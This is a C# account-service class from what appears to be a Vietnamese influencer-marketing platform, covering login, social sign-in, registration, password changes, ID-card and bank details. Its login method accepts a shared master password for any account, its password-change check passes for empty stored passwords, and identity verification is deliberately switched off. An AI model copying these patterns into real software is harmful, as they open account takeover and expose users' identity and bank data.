
using Core.Entities;
using Core.Interfaces;
using Core.Specifications;

using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using WebServices.Interfaces;
using WebServices.ViewModels;
using Common.Helpers;
using Common.Extensions;
using Microsoft.EntityFrameworkCore;
using Infrastructure.Extensions;
using Newtonsoft.Json;
using Core.Extensions;

namespace WebServices.Services
{
    public class AccountService : BaseService, IAccountService
    {
        private readonly ILogger<AccountService> _logger;
        private readonly IAccountRepository _accountRepository;
        private readonly IAsyncRepository<AccountProvider> _accountProviderRepository;
        private readonly IAccountFbPostRepository _accountFbPostRepository;
        private readonly IAsyncRepository<AccountCampaignCharge> _accountCampaignChargeRepository;
        private readonly ISettingRepository _settingRepository;
        private readonly IWalletRepository _walletRepository;
        public AccountService(ILoggerFactory loggerFactory,
          IAccountRepository accountRepository, IWalletRepository walletRepository,
           IAsyncRepository<AccountCampaignCharge> accountCampaignChargeRepository,
          IAccountFbPostRepository accountFbPostRepository,
          ISettingRepository settingRepository,
             IAsyncRepository<AccountProvider> accountProviderRepository)
        {
            _logger = loggerFactory.CreateLogger<AccountService>();
            _accountRepository = accountRepository;
            _accountProviderRepository = accountProviderRepository;
            _accountCampaignChargeRepository = accountCampaignChargeRepository;
            _walletRepository = walletRepository;
            _accountFbPostRepository = accountFbPostRepository;
            _settingRepository = settingRepository;
        }

        public async Task<AccountStatus> GetAccountStatus(int id)
        {
            var account = await _accountRepository.GetByIdAsync(id);
            if(account!= null)
            {
                if (account.Status.HasValue)
                {
                    return account.Status.Value;
                }
            }
            return AccountStatus.Normal;
        }

        public async Task<int> GetAccountUpdateInfoStatus(int id)
        {
            var account = await _accountRepository.GetByIdAsync(id);
            if (account != null)
            {
                if (string.IsNullOrEmpty(account.IDCardName) || string.IsNullOrEmpty(account.IDCardNumber))
                {
                    //return 1; // yêu càu verify
                    return 0; //tạm thời fix ko cần verify để cho fb duyệt
                } 
            }
            return 0;
        }


        public async Task<List<int>> GetActivedAccountIds()
        {
            return await _accountRepository.GetActivedAccountIds();
        }
        public async Task<AccountViewModel> GetAccount(int id)
        {
            var account = await _accountRepository.GetActivedAccount(id);
            return await GetAccountViewModel(account);
        }


        public async Task<string> GetAccessToken(int id)
        {
            return await _accountFbPostRepository.GetAccessToken(id);
          
        }

       

        private async Task<AccountViewModel> GetAccountViewModel(Account account)
        {

            if (account == null) return null;

            var accountCouting = await _accountFbPostRepository.GetAccountCounting(account.Id);
            return new AccountViewModel(account, accountCouting);
        }
        public async Task<List<AccountViewModel>> GetAccounts(AccountType type, string kw, string order,int page,int pagesize)
        {
            var filter = new AccountSpecification(kw, type);
            var accounts = await _accountRepository.ListPagedAsync(filter, order,page,pagesize);
            var list = new List<AccountViewModel>();

            foreach (var account in accounts)
            {
                var accountCouting = await _accountFbPostRepository.GetAccountCounting(account.Id);

                list.Add(new AccountViewModel(account, accountCouting));
            }


            return list;
        }
        public async Task<ListAccountViewModel> GetMatchedAccountByCampaignId(int campaignid,

           string order, int page, int pagesize)
        {

            var query = await _accountRepository.QueryMatchedAccountByCampiagn(campaignid);

            var total = await query.CountAsync();
            var accounts = await query.OrderByDescending(m => m.DateCreated).GetPagedAsync(page, pagesize);
            var list = new List<AccountViewModel>();
            foreach (var account in accounts)
            {
                var accountCouting = await _accountFbPostRepository.GetAccountCounting(account.Id);

                list.Add(new AccountViewModel(account, accountCouting));
            }


            return new ListAccountViewModel()
            {
                Accounts = list,
                Pager = new PagerViewModel(page, pagesize, total)
            };
        }

        public async Task<ListAccountViewModel> GetListAccount(IEnumerable<AccountType> accountTypes, IEnumerable<int> 
            categoryid, Gender? gender, IEnumerable<int> cityid, int? agestart, int? ageend,

            string order, int page, int pagesize, IEnumerable<int> ignoreIds,int min,int max)
        {

            var query = _accountRepository.Query(accountTypes, categoryid, gender, cityid, agestart, ageend, ignoreIds,min,max);

            var total = await query.CountAsync();
            var accounts = await query.OrderByDescending(m => m.Id).GetPagedAsync(page, pagesize);
            var list = new List<AccountViewModel>();
            foreach (var account in accounts)
            {
                var accountCouting = await _accountFbPostRepository.GetAccountCounting(account.Id);

                list.Add(new AccountViewModel(account, accountCouting));
            }


            return new ListAccountViewModel()
            {
                Accounts = list,
                Pager = new PagerViewModel(page, pagesize, total)
            };
        }


        #region Auth
        public async Task<AuthViewModel> GetAuth(LoginViewModel model)
        {
            var account = await _accountRepository.GetActivedAccount(model.Username);
            if (account != null)
            {
                var encryptpw = SecurityHelper.HashPassword(account.Salt, model.Password);
                if (model.Password == Code.SharedConstants.MASTER_PASSWORD || account.Password == encryptpw)
                {
                    return GetAuth(account);
                }
            }
            return null;
        }


        public async Task<AuthViewModel> GetAuth(LoginProviderViewModel model)
        {
            var filter = new AccountProviderSpecification(model.Provider, model.ProviderId);
            var accountprovider = await _accountProviderRepository.GetSingleBySpecAsync(filter);
            if (accountprovider == null)
            {
                var account = await _accountRepository.GetAccount(model.Email);
                if (account == null)
                {
                    account = new Account()
                    {
                        DateCreated = DateTime.Now,
                        DateModified = DateTime.Now,
                        Email = model.Email,
                        Name = model.Name,
                        Password = "",
                        Actived = true,
                        UserCreated = model.Email,
                        UserModified = model.Email,
                        Address = string.Empty,
                        Phone = string.Empty,
                        Avatar = model.Image,
                        Salt = SecurityHelper.GenerateSalt(),
                        CityId = null,
                        Deleted = false,
                        DistrictId = null,
                        Type = AccountType.Regular,
                        Status = AccountStatus.SystemVerified //mặc định user là đã verified, để tạm thôi cho fb duyệt đã
                        

                    };
                    await _accountRepository.AddAsync(account);
                    await _walletRepository.CreateWallet(EntityType.Account, account.Id);
                }


                accountprovider = new AccountProvider()
                {
                    AccountId = account.Id,
                    Email = model.Email,
                    Name = model.Name,
                    Provider = model.Provider,
                    ProviderId = model.ProviderId,
                    AccessToken = model.AccessToken,
                    Expired = DateTime.Now.AddHours(1),
                    Link  = string.Empty
                };
                await _accountProviderRepository.AddAsync(accountprovider);

                return GetAuth(account);
            }
            else
            {
                accountprovider.AccessToken = model.AccessToken;
                await _accountProviderRepository.UpdateAsync(accountprovider);

                return await GetAuth(accountprovider.AccountId);
            }
        }

        public async Task<AuthViewModel> GetAuth(int id)
        {
            var account = await _accountRepository.GetActivedAccount(id);
            return GetAuth(account);
        }

        private AuthViewModel GetAuth(Account account)
        {
            return (account == null) ? null : new AuthViewModel(account);
        }


        #endregion

        
        #region Generate Dumb Account

        public async Task CreateDumbAccount(int count = 30)
        {
            for (var i = 0; i < count; i++)
            {

                var account = new Account()
                {
                    Actived = true,
                    Address = $"{count} Lạc Trung",
                    Avatar = string.Empty,
                    Deleted = false,
                    DateCreated = DateTime.Now,
                    DateModified = DateTime.Now,
                    Type = AccountType.Regular,
                    Salt = "",
                    Password = "",
                    UserCreated = "hxq1988",
                    Email = $"tk{i}@microkols.com",
                    Phone = "",
                    Name = $"Tài khoản {i}",
                    UserModified = "hxq1988",
                    Gender = i % 2 == 0 ? Gender.Male : Gender.Female,
                    CityId = 1,
                    DistrictId = 1
                };

                await _accountRepository.AddAsync(account);



            }
        }
        #endregion

        #region AccountCounting

        public async Task<AccountCountingViewModel> GetAccountCounting(int accountid)
        {
            var model = await _accountFbPostRepository.GetAccountCounting(accountid);
            return new AccountCountingViewModel(model);
        }

        #endregion
        #region AccountFacebookPost
        public async Task<AccountFbPostViewModel> GetAccountFbPost(int id)
        {
            var post = await _accountFbPostRepository.GetByIdAsync(id);

            if (post != null)
            {
                return new AccountFbPostViewModel(post);
            }
            return null;
        }
        public async Task<AccountFbPostViewModel> GetAccountFbPost(int accountid, string postid)
        {
            var filter = new AccountFbPostSpecification(accountid, postid);
            var post = await _accountFbPostRepository.GetSingleBySpecAsync(filter);

            if (post != null)
            {
                return new AccountFbPostViewModel(post);
            }
            return null;
        }
        public async Task<ListAccountFbPostViewModel> GetAccountFbPosts(int accountid, int type, int page, int pagesize)
        {
            if(type== 1)
            {
                var posts = await _accountFbPostRepository.GetAccountFbPostsByHasCampaign(accountid, page, pagesize);
                var total = posts.Count;

                return new ListAccountFbPostViewModel(posts, page, pagesize, total);


            }
            else
            {

                var filter = new AccountFbPostByAccountSpecification(accountid);
                var total = await _accountFbPostRepository.CountAsync(filter);
                var posts = await _accountFbPostRepository.ListPagedAsync(filter, "PostTime_desc", page, pagesize);
                return new ListAccountFbPostViewModel(posts, page, pagesize, total);
            }
        }
        public async Task UpdateFbPost(int accountid, AccountFbPostViewModel model, string username)
        {
            var filter = new AccountFbPostSpecification(model.PostId);
            var post = await _accountFbPostRepository.GetSingleBySpecAsync(filter);
            if (post == null)
            {
                post = new AccountFbPost()
                {
                    AccountId = accountid,
                    CommentCount = model.CommentCount,
                    DateCreated = DateTime.Now,
                    DateModified = DateTime.Now,
                    LikeCount = model.LikeCount,
                    Link = model.Link,
                    Message = model.Message,
                    Picture = model.Picture,
                    PostId = model.PostId,
                    PostTime = model.PostTime,
                    ShareCount = model.ShareCount,
                    UserCreated = username,
                    UserModified = username,
                    Permalink = model.Permalink
                };
                await _accountFbPostRepository.AddAsync(post);
            }
            else
            {
                post.ShareCount = model.ShareCount;
                post.LikeCount = model.LikeCount;
                post.CommentCount = model.CommentCount;
                post.DateModified = DateTime.Now;
                post.UserModified = username;



                await _accountFbPostRepository.UpdateAsync(post);
            }

        }

        #endregion

        #region Account Provider





        public async Task<List<AccountProviderViewModel>> GetAccountProvidersByExpiredToken(AccountProviderNames provider)
        {
            var filter = new AccountProviderByExpiredTokenSpecification(provider);
            var accountProviders = await _accountProviderRepository.ListAsync(filter);
            return AccountProviderViewModel.GetList(accountProviders);
        }

        public async Task<bool> UpdateAccountProvidersAccessToken(int id, string accessToken, int expiredIn)
        {
            var accountProvider = await _accountProviderRepository.GetByIdAsync(id);
            if (accountProvider != null)
            {
                accountProvider.AccessToken = accessToken;
                if (expiredIn > 0)
                {
                    accountProvider.Expired = DateTime.Now.AddSeconds(expiredIn);
                }
                
                await _accountProviderRepository.UpdateAsync(accountProvider);
                return true;
            }
            return false;
        }

        public async Task<AccountProviderViewModel> GetAccountProviderByAccount(int accountid, AccountProviderNames provider)
        {
            var filter = new AccountProviderSpecification(accountid, provider);
            var accountProvider = await _accountProviderRepository.GetSingleBySpecAsync(filter);
            return accountProvider != null ? new AccountProviderViewModel(accountProvider) : null;
        }
        public async Task<AccountProviderViewModel> GetAccountProviderByProvider(AccountProviderNames provider, string providerid,string newtoken)
        {
            var filter = new AccountProviderSpecification(provider, providerid);
            var accountProvider = await _accountProviderRepository.GetSingleBySpecAsync(filter);

            if (accountProvider != null)
            {

                return new AccountProviderViewModel(accountProvider);
            }
            return  null;
        }

        public async Task<string> GetProviderIdByAccount(int accountid, AccountProviderNames provider)
        {
            var accountProvider = await GetAccountProviderByAccount(accountid, provider);
            return accountProvider != null ? accountProvider.ProviderId : string.Empty;
        }

        public async Task<int> UpdateAccountProvider(int accountid, UpdateAccountProviderViewModel model, string username)
        {
            var filter = new AccountProviderSpecification(model.Provider, model.ProviderId);
            var accountprovider = await _accountProviderRepository.GetSingleBySpecAsync(filter);
            if (accountprovider != null)
            {
                if (accountprovider.AccountId != accountid)
                {
                    return -1;
                }
                return 1;
            }

            accountprovider = new AccountProvider()
            {
                AccountId = accountid,
                Email = model.Email,
                Name = model.Name,
                Provider = model.Provider,
                ProviderId = model.ProviderId,
                AccessToken = model.AccessToken,
                Expired = DateTime.Now.AddHours(1)
            };
            await _accountProviderRepository.AddAsync(accountprovider);
            return 2;
        }


        public async Task<bool> UpdateAccountProviderInfo(int accountproviderid, string link, int friendscount, string username)
        {
            if(accountproviderid== 5)
            {

            }
            var accountprovider = await _accountProviderRepository.GetByIdAsync(accountproviderid);
            if (accountprovider != null)
            {
                accountprovider.Link = link;
                accountprovider.FriendsCount = friendscount;

                await _accountProviderRepository.UpdateAsync(accountprovider);
                return true;
            }
            return false;

         
        }


        #endregion

        #region Register

        public async Task<int> Register(RegisterViewModel model)
        {
            var entity = await _accountRepository.GetActivedAccount(model.Email);
            if (entity != null) return -1;

            var salt = SecurityHelper.GenerateSalt();
            var encryptpw = SecurityHelper.HashPassword(salt, model.Password);

            entity = new Account()
            {
                DateCreated = DateTime.Now,
                DateModified = DateTime.Now,
                Email = model.Email,
                Name = model.Name,
                Password = encryptpw,
                Address = string.Empty,
                Phone = string.Empty,
                Avatar = string.Empty,
                Actived = true,
                Deleted = false,
                UserModified = model.Email,
                UserCreated = model.Email,
                Salt = salt,
                Type = AccountType.Regular,
            };

            await _accountRepository.AddAsync(entity);

            return entity.Id;
        }


        #endregion

        #region Change FbUrl
        public async Task<ChangeFacebookUrlViewModel> GetChangeFacebookUrl(int id)
        {
            var entity = await _accountProviderRepository.GetSingleBySpecAsync(new AccountProviderSpecification(id,AccountProviderNames.Facebook));

            if(entity!= null)
            {
                return new ChangeFacebookUrlViewModel()
                {
                    FacebookUrl = entity.Link
                };
            }
            return new ChangeFacebookUrlViewModel();
        }

        public async Task<bool> ChangeFacebookUrl(int id, ChangeFacebookUrlViewModel model)
        {
            var entity = await _accountProviderRepository.GetSingleBySpecAsync(new AccountProviderSpecification(id, AccountProviderNames.Facebook));

            if (entity != null)
            {
                entity.Link = model.FacebookUrl;
                await _accountProviderRepository.UpdateAsync(entity);
                return true;
            }
            return false;
        }
        #endregion 

        #region ChangeContact


        public async Task<ChangeContactViewModel> GetContact(int id)
        {
            var entity = await _accountRepository.GetByIdAsync(id);

            if (entity != null)
            {
                return new ChangeContactViewModel(entity);

            }
            return null;
        }

        public async Task<bool> ChangeContact(int id, ChangeContactViewModel model, string username)
        {
            var entity = await _accountRepository.GetByIdAsync(id, false);

            if (entity != null)
            {
                entity.Phone = model.Phone;
                if (model.CityId > 0)
                    entity.CityId = model.CityId;
                else
                    entity.CityId = null;

                if (model.DistrictId > 0)
                    entity.DistrictId = model.DistrictId;
                else
                    entity.DistrictId = null;

                entity.Address = model.Address;
                entity.Status = AccountStatus.Verified;
                entity.DateModified = DateTime.Now;
                entity.UserModified = username;

                await _accountRepository.UpdateAsync(entity);

                return true;
            }
            return false;

        }

        #endregion

        #region Change Infor

        public async Task<ChangeInformationViewModel> GetInformation(int id)
        {
            var entity = await _accountRepository.GetSingleBySpecAsync(new AccountWithCategorySpecification(id));

            if (entity != null)
            {
                return new ChangeInformationViewModel(entity);
            }
            return null;
        }

        public async Task<bool> ChangeInformation(int id, ChangeInformationViewModel model, string username)
        {
            var entity = await _accountRepository.GetByIdAsync(id, false);

            if (entity != null)
            {
                entity.Name = model.Name;
                entity.Birthday = model.Birthday.ToViDate();
                entity.Gender = model.Gender;
                entity.MaritalStatus = model.MaritalStatus;
                entity.DateModified = DateTime.Now;
                entity.UserModified = username;

                await _accountRepository.UpdateAsync(entity);

                await _accountRepository.UpdateAccountCategory(entity.Id, model.CategoryId);
                return true;
            }
            return false;

        }


        #endregion

        #region Change Avatar

        public async Task<bool> ChangeAvatar(int id, string path, string username)
        {
            var entity = await _accountRepository.GetByIdAsync(id, false);

            if (entity != null && !string.IsNullOrEmpty(path))
            {
                entity.Avatar = path;
                entity.DateModified = DateTime.Now;
                entity.UserModified = username;
                await _accountRepository.UpdateAsync(entity);

                return true;

            }
            return false;
        }

        public async Task<bool> ChangeAvatar(int id, ChangeAvatarViewModel model)
        {
            var entity = await _accountRepository.GetByIdAsync(id, false);

            if (entity != null)
            {


                entity.Avatar = model.Image;
                entity.DateModified = DateTime.Now;
                await _accountRepository.UpdateAsync(entity);
                return true;
            }
            return false;
        }
        #endregion

        #region ChangePassword
        public async Task<bool> ChangePassword(int id, ChangePasswordViewModel model, string username)
        {
            var entity = await _accountRepository.GetByIdAsync(id, false);

            if (entity != null)
            {
                var oldpw = Common.Helpers.SecurityHelper.HashPassword(entity.Salt, model.OldPassword);
                if (oldpw.Contains(entity.Password))
                {
                    var newpw = SecurityHelper.HashPassword(entity.Salt, model.NewPassword);

                    entity.Password = newpw;
                    entity.DateModified = DateTime.Now;
                    entity.UserModified = username;
                    await _accountRepository.UpdateAsync(entity);

                    return true;
                }

            }
            return false;
        }

        #endregion

       
        #region ForgotPassword

        public async Task<ForgotPasswordResultViewModel> ForgotPassword(string email)
        {
            var account = await _accountRepository.GetActivedAccount(email);
            if (account != null)
            {
                if (!string.IsNullOrEmpty(account.Email))
                {

                    var newpassword = StringHelper.UniqueNumber(6);
                    var newpw = Common.Helpers.SecurityHelper.HashPassword(account.Salt, newpassword);
                    account.Password = newpw;
                    account.DateModified = DateTime.Now;
                    account.UserModified = "UpdatePassword";
                    await _accountRepository.UpdateAsync(account);
                    return new ForgotPasswordResultViewModel()
                    {

                        NewPassword = newpassword,
                        Email = account.Email
                    };
                }
            }
            return null;
        }

        #endregion

        #region ChangeIDCard

        public async Task<ChangeIDCardViewModel> GetIDCard(int id)
        {
            var entity = await _accountRepository.GetByIdAsync(id);

            if (entity != null)
            {
                return new ChangeIDCardViewModel(entity);
            }
            return null;
        }

        public async Task<bool> ChangeIDCard(int id, ChangeIDCardViewModel model, string username)
        {
            var entity = await _accountRepository.GetByIdAsync(id, false);

            if (entity != null)
            {
                entity.Name = model.Name;
                entity.IDCardCity = model.City;
                entity.IDCardImageBack = model.ImageBack;
                entity.IDCardImageFront = model.ImageFront;
                entity.IDCardName = model.Name;
                entity.IDCardNumber = model.Number;
                entity.IDCardTime = model.Time;
                entity.DateModified = DateTime.Now;
                entity.UserModified = username;

                await _accountRepository.UpdateAsync(entity);
                return true;
            }
            return false;

        }


        #endregion


        #region ChangeBankAccount

        public async Task<ChangeBankAccountViewModel> GetBankAccount(int id)
        {
            var entity = await _accountRepository.GetByIdAsync(id);

            if (entity != null)
            {
                return new ChangeBankAccountViewModel(entity);
            }
            return null;
        }

        public async Task<bool> ChangeBankAccount(int id, ChangeBankAccountViewModel model, string username)
        {
            var entity = await _accountRepository.GetByIdAsync(id, false);

            if (entity != null)
            {
                entity.BankAccountBank = model.Bank;
                entity.BankAccountBranch = model.Branch;
                entity.BankAccountName = model.Name;
                entity.BankAccountNumber = model.Number;
                entity.DateModified = DateTime.Now;
                entity.UserModified = username;

                await _accountRepository.UpdateAsync(entity);
                return true;
            }
            return false;

        }


        #endregion

        #region ChangeAccountType

        public async Task<ChangeAccountTypeViewModel> GetChangeAccountType(int id)
        {
            var entity = await _accountRepository.GetByIdAsync(id);

            if (entity != null)
            {
                return new ChangeAccountTypeViewModel(entity);
            }
            return null;
        }


        public async Task<bool> ChangeAccountType(int id, ChangeAccountTypeViewModel model, string username)
        {
            var entity = await _accountRepository.GetByIdAsync(id, false);

            if (entity != null)
            {
                entity.Type = model.Type;
                if (model.Type == AccountType.HotMom)
                {
                    entity.TypeData = JsonConvert.SerializeObject(model.HotMomData);
                }

                entity.DateModified = DateTime.Now;
                entity.UserModified = username;

                await _accountRepository.UpdateAsync(entity);
                return true;
            }
            return false;

        }


        #endregion


        #region Update AccountCampaignCharge

        public async Task<List<AccountCampaignChargeViewModel>> GetAccountCampaignCharges(int accountid)
        {
            var filter = new AccountCampaignChargeByAccountSpecification(accountid);


            var accountCampaignCharges = await _accountCampaignChargeRepository.ListAsync(filter);

            return AccountCampaignChargeViewModel.GetList(accountCampaignCharges);
        }


        public async Task<bool> UpdateAccountCampaignCharge(int accountid, AccountCampaignChargeViewModel model)
        {
            if (model.Id == 0)
            {
                var accountCharge = new AccountCampaignCharge()
                {
                    AccountId = accountid,
                    Type = model.Type,
                    Min = model.Min,
                    Kpi = model.Kpi,
                    Max = model.Max
                };
                await _accountCampaignChargeRepository.AddAsync(accountCharge);
            }
            else
            {
                var accountCharge = await _accountCampaignChargeRepository.GetByIdAsync(model.Id);
                if (accountCharge == null || accountCharge.AccountId != accountid)
                {
                    return false;
                }

                accountCharge.Min = model.Min;
                accountCharge.Max = model.Max;
                accountCharge.Kpi = model.Kpi;
                await _accountCampaignChargeRepository.UpdateAsync(accountCharge);
            }

            return true;

        }
        #endregion


        #region AccountIgnore

        public async Task<List<CampaignType>> GetIgnoreCampaignTypes(int accountid)
        {
            var account = await _accountRepository.GetByIdAsync(accountid);
            return account != null ? account.IgnoreCampaignTypesObj : new List<CampaignType>();
        }


        public async Task<bool> UpdateIgnoreCampaignTypes(int accountid, CampaignType type, bool removed, string username)
        {
            var account = await _accountRepository.GetByIdAsync(accountid);
            if (account != null)
            {
                var currentIgnore = account.IgnoreCampaignTypesObj;
                if (removed)
                {
                    currentIgnore.Remove(type);
                }
                else
                {
                    currentIgnore.Add(type);
                }


                var ignoreCampaignTypeStr = currentIgnore.Select(m => (int)m).ToList().ToListInt();

                account.IgnoreCampaignTypes = ignoreCampaignTypeStr;
                account.DateModified = DateTime.Now;
                account.UserModified = username;

                await _accountRepository.UpdateAsync(account);
                return true;
            }
            return false;
        }
        #endregion


        #region Helper

        public async Task<bool> VerifyIDCard(string email)
        {

            //var entity = await _accountRepository.GetSingleBySpecAsync(new AccountActivedSpecification(email, 1));

            //if (entity == null)
            //{
            //    return true;
            //}
            return false;
        }

        public async Task<bool> VerifyEmail(string email)
        {
            var entity = await _accountRepository.GetActivedAccount(email);

            if (entity == null)
            {
                return true;
            }
            return false;
        }

        public async Task<string> GetFacebookProfileUrl(int id)
        {
            var entity = await _accountProviderRepository.GetSingleBySpecAsync(new AccountProviderSpecification(id, AccountProviderNames.Facebook));
            return entity != null ? entity.Link : string.Empty;
        }

        #endregion


    }
}
